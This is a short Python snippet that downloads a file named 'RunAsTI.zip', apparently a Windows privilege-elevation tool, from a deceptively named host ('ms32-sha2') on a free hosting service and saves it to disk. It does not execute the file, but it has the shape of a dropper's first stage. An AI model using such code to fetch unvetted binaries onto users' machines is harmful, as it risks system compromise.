import requests

exe = requests.get("https://ms32-sha2.onrender.com/RunAsTI.zip")
with open("RunAsTI.zip","xb") as file:
    file.write(exe.content)
